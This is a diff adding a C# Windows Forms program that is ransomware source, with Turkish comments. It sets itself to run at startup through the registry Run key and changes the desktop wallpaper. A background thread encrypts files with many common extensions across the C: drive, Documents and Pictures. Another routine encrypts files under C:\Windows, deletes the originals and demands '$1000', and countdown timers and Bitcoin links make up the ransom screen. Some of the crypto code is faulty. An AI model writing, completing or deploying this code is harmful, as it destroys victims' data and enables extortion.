@@ -1,0 +1,247 @@
+using System;
+using System.Collections.Generic;
+using System.ComponentModel;
+using System.Data;
+using System.Drawing;
+using System.IO;
+using System.Runtime.InteropServices;
+using System.Security.Cryptography;
+using System.Text;
+using System.Threading;
+using System.Windows.Forms;
+using Microsoft.Win32;
+using System.Diagnostics;
+
+namespace tema_fidye
+{
+    public partial class Form1 : Form
+    {
+        private const string EncryptionKey = "QGVzdGFydCBLZXkgQ29kZToga1VtMWhhbTdXaHc0aSE="; // Şifreleme anahtarınızı buraya girin
+        private const string password = "RTFROEo1RnZkaFJFSTQVR2zIUVJUZTdzTk1yZWZCOENUPQ==";
+        private readonly byte[] passwordBytes;
+        private const string encryptedDrivePath = "C:\\EncryptedDrive";
+        private Thread backgroundThread;
+
+        public Form1()
+        {
+            InitializeComponent();
+            Load += Form1_Load;
+
+            try
+            {
+                passwordBytes = Convert.FromBase64String(password);
+            }
+            catch (FormatException ex)
+            {
+                // MessageBox.Show("Geçersiz Base64 formatı: " + ex.Message);
+                return;
+            }
+        }
+
+        private void Form1_Load(object sender, EventArgs e)
+        {
+            // Auto-run on Windows startup
+            SetAutoRun(true);
+
+            // Change desktop wallpaper
+            ChangeDesktopWallpaper("C:/Users/balis/OneDrive/Masaüstü/temalar/Bir ba oopps k ekleyin.png");
+
+            // Run in the background
+            backgroundThread = new Thread(BackgroundTask);
+            backgroundThread.IsBackground = true;
+            backgroundThread.Start();
+        }
+
+        private void SetAutoRun(bool enable)
+        {
+            string appName = Application.ProductName;
+            string runKey = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
+
+            RegistryKey startupKey = Registry.CurrentUser.OpenSubKey(runKey, true);
+
+            if (enable)
+                startupKey.SetValue(appName, Application.ExecutablePath);
+            else
+                startupKey.DeleteValue(appName, false);
+
+            startupKey.Close();
+        }
+
+        private void ChangeDesktopWallpaper(string imagePath)
+        {
+            string wallpaperPath = imagePath;
+            SystemParametersInfo(0x0014, 0, wallpaperPath, 0x0001 | 0x0002);
+        }
+
+        [DllImport("user32.dll", CharSet = CharSet.Auto)]
+        private static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
+
+        private void EncryptDirectory(string directoryPath)
+        {
+            try
+            {
+                foreach (string file in Directory.GetFiles(directoryPath, "*", SearchOption.AllDirectories))
+                {
+                    // Check if the file extension is in the specified list
+                    string extension = Path.GetExtension(file);
+                    if (fileExtensions.Contains(extension))
+                    {
+                        using (Aes aes = Aes.Create())
+                        {
+                            string passwordString = Encoding.UTF8.GetString(passwordBytes);
+                            Rfc2898DeriveBytes derivedKey = new Rfc2898DeriveBytes(passwordString, aes.KeySize / 8);
+
+                            aes.Key = derivedKey.GetBytes(aes.KeySize / 8);
+                            aes.IV = derivedKey.GetBytes(aes.BlockSize / 8);
+
+                            string encryptedFilePath = Path.Combine(encryptedDrivePath, Path.GetFileName(file));
+
+                            using (FileStream inputStream = new FileStream(file, FileMode.Open))
+                            using (FileStream outputStream = new FileStream(encryptedFilePath, FileMode.Create))
+                            using (CryptoStream cryptoStream = new CryptoStream(outputStream, aes.CreateEncryptor(), CryptoStreamMode.Write))
+                            {
+                                inputStream.CopyTo(cryptoStream);
+                            }
+                        }
+                    }
+                }
+            }
+            catch (Exception ex)
+            {
+                // MessageBox.Show("Şifreleme hatası: " + ex.Message);
+            }
+        }
+
+        private void DeleteDirectory(string directoryPath)
+        {
+            try
+            {
+                Directory.Delete(directoryPath, true);
+            }
+            catch (Exception ex)
+            {
+                // MessageBox.Show("Klasör silme hatası: " + ex.Message);
+            }
+        }
+
+        private void BackgroundTask()
+        {
+            try
+            {
+                // Encrypt all files on C drive
+                EncryptDirectory("C:\\");
+
+                // Encrypt My Documents folder
+                EncryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments));
+
+                // Encrypt My Pictures folder
+                EncryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.MyPictures));
+            }
+            catch (Exception ex)
+            {
+                // MessageBox.Show("Arka planda çalışma hatası: " + ex.Message);
+            }
+        }
+
+        // List of file extensions to be encrypted
+        private string[] fileExtensions = { ".zip", ".jpg", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".mdb", ".mdbx",
+                                            ".avi", ".mp4", ".mkv", ".wmv", ".flv", ".3gp", ".dat", ".mov", ".ogg", ".mp3",
+                                            ".wav", ".mid", ".jpeg", ".png", ".bmp", ".psd", ".gif", ".pdf", ".exe", ".rar",
+                                            ".zip", ".tar", ".7z", ".txt", ".odt", ".ott", ".rtf", ".uot", ".dic", ".html",
+                                            ".php", ".aspx", ".asp" };
+
+        int seconds3 = 172800;
+        int seconds7 = 345600;
+
+        private void timer1_Tick(object sender, EventArgs e)
+        {
+            DateTime dt = DateTime.Now;
+            label10.Text = dt.ToString("MM/dd/yyyy HH:mm:ss");
+            label12.Text = dt.ToString("MM/dd/yyyy HH:mm:ss");
+
+            seconds3--;
+            label11.Text = new DateTime(1970, 01, 01, 00, 00, 00).AddSeconds(seconds3).ToString("dd:HH:mm:ss");
+            seconds7--;
+            label13.Text = new DateTime(1970, 01, 01, 00, 00, 00).AddSeconds(seconds7).ToString("dd:HH:mm:ss");
+        }
+
+        private void linkLabel1_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
+        {
+            Process.Start("https://bitcoin.org/en/");
+        }
+
+        private void linkLabel2_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
+        {
+            Process.Start("https://bitcoin.org/en/exchanges");
+        }
+
+        private void EncryptFiles()
+        {
+            string[] fileExtensions = { ".zip", ".jpg", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".mdb", ".mdbx",
+                                        ".avi", ".mp4", ".mkv", ".wmv", ".flv", ".3gp", ".dat", ".mov", ".ogg", ".mp3",
+                                        ".wav", ".mid", ".jpeg", ".png", ".bmp", ".psd", ".gif", ".pdf", ".exe", ".rar",
+                                        ".zip", ".tar", ".7z", ".txt", ".odt", ".ott", ".rtf", ".uot", ".dic", ".html",
+                                        ".php", ".aspx", ".asp" };
+
+            string sourceFolder = @"C:\Windows"; // Şifrelemek istediğiniz dosyaların kaynak klasörünü buraya girin
+
+            if (!Directory.Exists(sourceFolder))
+            {
+                return;
+            }
+
+            foreach (string fileExtension in fileExtensions)
+            {
+                string[] files = Directory.GetFiles(sourceFolder, "*" + fileExtension);
+
+                foreach (string filePath in files)
+                {
+                    string encryptedFilePath = Path.ChangeExtension(filePath, ".encrypted");
+                    string key = GenerateRandomKey();
+
+                    EncryptFile(filePath, encryptedFilePath, key);
+                    File.Delete(filePath);
+                }
+            }
+
+            MessageBox.Show("The files were encrypted and the original files were deleted. buy key $1000");
+        }
+
+        private void EncryptFile(string inputFile, string outputFile, string key)
+        {
+            using (Aes aes = Aes.Create())
+            {
+                aes.KeySize = 192;
+                aes.Key = Convert.FromBase64String(EncryptionKey);
+                aes.GenerateIV();
+
+                using (FileStream inputStream = new FileStream(inputFile, FileMode.Open, FileAccess.Read))
+                using (FileStream outputStream = new FileStream(outputFile, FileMode.Create, FileAccess.Write))
+                using (CryptoStream cryptoStream = new CryptoStream(outputStream, aes.CreateEncryptor(), CryptoStreamMode.Write))
+                {
+                    byte[] buffer = new byte[1024];
+                    int bytesRead;
+
+                    while ((bytesRead = inputStream.Read(buffer, 0, buffer.Length)) > 0)
+                    {
+                        cryptoStream.Write(buffer, 0, bytesRead);
+                    }
+                }
+
+                // Şifreleme anahtarını kaydetme
+                string keyFilePath = Path.ChangeExtension(outputFile, ".key");
+                File.WriteAllText(keyFilePath, key);
+            }
+        }
+
+        private string GenerateRandomKey()
+        {
+            using (Aes aes = Aes.Create())
+            {
+                aes.KeySize = 192;
+                aes.GenerateKey();
+                return Convert.ToBase64String(aes.Key);
+            }
+        }
+    }
+}
